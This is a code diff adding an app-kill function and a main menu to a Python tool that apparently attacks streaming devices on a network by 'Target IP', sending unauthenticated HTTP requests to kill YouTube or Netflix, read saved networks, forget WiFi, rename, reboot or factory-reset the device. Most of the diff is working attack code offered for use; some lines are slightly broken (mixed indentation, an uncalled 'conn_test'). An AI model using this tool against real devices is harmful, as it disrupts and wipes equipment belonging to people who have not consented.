@@ -286,3 +286,86 @@ def reset():
 	else:
 		print(R + '[-]' + C + ' Failed, Status : ' + W + str(r_sc))
 
+def appkill():
+    	print (G + '[1]' + C + ' YouTube' + W)
+	print (G + '[2]' + C + ' Netflix' + W)
+	#print (G + '[3]' + C + ' Google Play Music' + W)
+	choice = input('\n' + R + '[>] ' + W)
+	print ('\n' + Y + '[!] Sending Request...' + W)
+	if choice == '1':
+		url = 'http://{}:{}/apps/YouTube'.format(ip, http_port)
+		try:
+			r = requests.delete(url, headers=http_header, verify=False)
+		except Exception as exc:
+			print(R + '[-]' + C + ' Exception : ' + W + str(exc))
+			return
+		r_sc = r.status_code
+		if r_sc == 200:
+			print(G + '[+]' + C + ' Action Completed!' + W)
+		else:
+			print(R + '[-]' + C + ' Failed, Status : ' + W + str(r_sc))
+	elif choice == '2':
+		url = 'http://{}:{}/apps/Netflix'.format(ip, http_port)
+		try:
+			r = requests.delete(url, headers=http_header, verify=False)
+		except Exception as exc:
+			print(R + '[-]' + C + ' Exception : ' + W + str(exc))
+			return
+		r_sc = r.status_code
+		if r_sc == 200:
+			print(G + '[+]' + C + ' Action Completed!' + W)
+		else:
+			print(R + '[-]' + C + ' Failed, Status : ' + W + str(r_sc))
+
+def menu():
+	while True:
+		print('\n' + Y + '[!] Actions : ' + W + '\n')
+		print(G + '[1]' + C + ' Device Information' + W)
+		print(G + '[2]' + C + ' IP Information' + W)
+		print(G + '[3]' + C + ' Saved Networks' + W)
+		print(G + '[4]' + C + ' Scan for Networks' + W)
+		print(G + '[5]' + C + ' Forget WiFi Network' + W)
+		print(G + '[6]' + C + ' Rename' + W)
+		print(G + '[7]' + C + ' Kill Apps' + W)
+		print(G + '[8]' + C + ' Reboot' + W)
+		print(G + '[9]' + C + ' Factory Reset' + W)
+		print(G + '[0]' + C + ' Exit' + W)
+
+		choice = input('\n' + R  + '[>]' + W)
+
+		if choice == '1':
+    			info()
+		elif choice == '2':
+			iprecon()
+		elif choice == '3':
+			saved_net()
+		elif choice == '4':
+			wscan()
+		elif choice == '5':
+			wforget()
+		elif choice == '6':
+			rename()
+		elif choice == '7':
+			appkill()
+		elif choice == '8':
+			reboot()
+		elif choice == '9':
+			reset()
+		elif choice == '0':
+			sys.exit()
+		else:
+			print ('\n' + R + '[-]' + C + ' Invalid Choice...Try Again.' + W)
+			menu()
+
+try:
+	banner()
+	ver_check()
+	print (G + '[+]' + C + ' Target IP : ' + W + ip)
+	conn_test
+	info()
+	iprecon()
+	menu()
+except KeyboardInterrupt:
+	print("you have entered ctrl+c")
+	sys.exit()
+
